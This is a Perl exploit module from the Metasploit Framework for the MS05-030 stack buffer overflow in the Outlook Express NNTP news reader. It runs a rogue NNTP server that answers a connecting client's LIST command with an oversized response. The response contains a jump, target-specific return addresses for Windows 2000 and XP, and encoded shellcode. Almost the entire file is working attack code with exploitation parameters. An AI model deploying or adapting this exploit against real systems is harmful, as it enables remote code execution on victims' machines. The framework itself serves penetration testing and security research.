##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ms05_030_nntp;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use  POSIX;

my $advanced =
  {
  };

my $info =
  {
	'Name'           => 'Microsoft Outlook Express NNTP Response Parsing MS05-030 Buffer Overflow',
	'Version'        => '$Revision: 1.1 $',
	'Authors'        => [ 'y0 [at] w00t-shell.net' ],
	'Description'    =>
	  Pex::Text::Freeform(qq{
   		This module exploits a stack overflow in the news reader of Microsoft
		Outlook Express.  	
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'win2000', 'winxp' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'NNTPPORT'    => [ 1, 'PORT', 'The local NNTP listener port', 119        ],
		'NNTPSERVER'  => [ 1, 'HOST', 'The local NNTP listener host', "0.0.0.0"  ],
	  },

	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'Payload'      =>
	  {
		'Space'    => 650,
		'BadChars' => "\x00",
		'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",
		'MaxNops'  => 0,
		'Keys'     => [ '-ws2ord', '-bind' ],
	  },

	'Encoder' =>
	  {
		'Keys' => ['+alphanum'],
	  },

	'Refs'            =>
	  [
		[ 'URL', 'http://www.microsoft.com/technet/security/bulletin/ms05-030.mspx' ],
		[ 'CVE', '2005-1213' ],
		[ 'BID', '13951' ],
		[ 'MSB', 'MS05-030' ],
		[ 'OSVDB', '17306' ],
	  ],

	'DefaultTarget'  => -1,

	'Targets'        =>
	  [
		[ 'Windows 2000 Pro All English',   9620, 0x75022ac4 ],
		[ 'Windows XP Pro SP0/SP1 English', 9592, 0x71aa32ad ],
	  ],

	'Keys'           => [ 'nntp' ],

	'DisclosureDate' => 'June 14 2005 ',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('NNTPSERVER'),
		LocalPort => $self->GetVar('NNTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local NNTP listener on ". $self->GetVar('NNTPPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to " . $self->GetVar('NNTPSERVER') . ":" . $self->GetVar('NNTPPORT') . " ...");

	while (defined($client = $server->accept()))
	{
		$self->HandleNNTPClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleNNTPClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $target    = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $rhost;
	my $rport;

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	my $first =  "200\r\n";

	my $second = "200\r\n";

	my $sploit =
	  "215 list". "\r\n". "group meta".
	  Pex::Text::AlphaNumText($target->[1]). "\xeb\x06\x92\x46".
	  pack('V', $target->[2]). $shellcode. " 1 y\r\n\.\r\n";

	$self->PrintLine("[*] NNTP Client connected from $rhost:$rport...");

	$fd->Send($first);

	my $resp = $fd->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] NNTP Client response: ' . $resp);

	if($resp !~ /MODE READER/) {
		$self->PrintLine('[*] Not a valid NNTP client response... ');
		return;
	}

	$fd->Send($second);

	my $resp = $fd->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] NNTP Client response: ' . $resp);

	if($resp !~ /LIST/) {
		$self->PrintLine('[*] Not a valid NNTP client response... ');
		return;
	}

	$self->PrintLine("[*] Sending ". length($sploit). " bytes of payload...");

	$fd->Send($sploit);

	$self->Handler($fd);

	$fd->Close();
}

1;

